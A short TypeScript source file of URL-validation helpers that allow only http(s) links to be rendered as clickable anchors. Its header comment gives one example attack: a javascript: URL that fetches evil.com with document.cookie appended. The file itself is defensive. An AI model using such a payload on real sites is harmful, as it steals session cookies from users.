/**
 * URL safety helpers.
 *
 * Links entered by users (e.g. a recording's video_link) are rendered as
 * clickable anchors. Without validation, a value like
 * `javascript:fetch('https://evil.com?c='+document.cookie)` would execute on
 * click. We only ever allow http(s) URLs, validated both on input and render.
 */

/** Returns true only for well-formed http:// or https:// URLs. */
export function isSafeHttpUrl(value: string | undefined | null): boolean {
  if (!value) return false
  let parsed: URL
  try {
    parsed = new URL(value.trim())
  } catch {
    return false
  }
  return parsed.protocol === 'http:' || parsed.protocol === 'https:'
}

/**
 * Returns the URL if it is a safe http(s) link, otherwise undefined.
 * Use to guard an anchor's href so unsafe values are never rendered clickable.
 */
export function safeHref(value: string | undefined | null): string | undefined {
  return isSafeHttpUrl(value) ? value!.trim() : undefined
}
